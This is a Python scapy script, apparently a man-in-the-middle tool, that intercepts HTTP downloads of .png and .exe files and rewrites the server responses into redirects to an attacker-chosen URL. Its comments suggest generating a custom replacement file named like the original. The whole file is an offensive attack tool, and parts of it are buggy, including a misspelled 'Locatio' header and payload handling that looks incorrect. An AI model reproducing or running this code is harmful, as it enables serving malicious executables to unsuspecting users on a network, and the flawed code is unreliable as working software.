from scapy.layers.http import HTTPResponse
from scapy.layers.http import HTTPRequest

from scapy.layers.inet6 import IPv6

from scapy.layers.inet import TCP
from scapy.layers.inet import IP

from scapy.layers.ipsec import Raw

from scapy.layers.l2 import Ether


class FileInterceptor:

    EXTENSIONS: list[str] = [
        '.png',
        '.exe'
    ]

    ack = set()

    @classmethod
    def _set_load(cls, packet: Ether, load: str, /) -> Ether:
        '''
        You can also create a load handler
        See whats the user are downloading, and create a custom file in real time based on
        Turn it online in a custom link, your machine, maybe (not recomended), and set load
        You can also get the file name and when you create a custom file, rename it with the original name

        And more...
        '''
        packet[Raw].load = load

        if packet.haslayer(IP):
            del packet[IP].len
            del packet[IP].chksum

        if packet.haslayer(IPv6):
            del packet[IPv6].plen

        if packet.haslayer(TCP):
            del packet[TCP].chksum

        return packet

    @classmethod
    def _http_response_hamdler(cls, packet: Ether, /) -> Ether:
        if packet[TCP].seq in FileInterceptor.ack:
            FileInterceptor.ack.remove(packet[TCP].seq)
            print('[+] REPLACING FILE...')

            return FileInterceptor._set_load(packet, 'HTTP/1.1 301 Moved Permanetly\nLocatio: (custom_url_here)\n\n')

    @classmethod
    def _http_request_hamdler(cls, packet: Ether, /) -> None:
        '''
        You can change Accept-Encoding - HTTP to nothing to get Response Raw load not in hex... 
        '''
        for extension in FileInterceptor.EXTENSIONS:
            if extension in bytes(packet[Raw].load).decode():
                FileInterceptor.ack.add(packet[TCP].ack)
                return

    @classmethod
    def http_intercept(cls, packet: Ether, /) -> None:
        pck: Ether = packet.payload

        if not pck.haslayer(Raw):
            return

        if pck.haslayer(HTTPRequest):
            FileInterceptor._http_request_hamdler(pck)

        if pck.haslayer(HTTPResponse):
            packet.add_payload(str(
                FileInterceptor._http_response_hamdler(pck)
            )) # Maybe bytes(FileInterceptor._http_response_hamdler(pck))
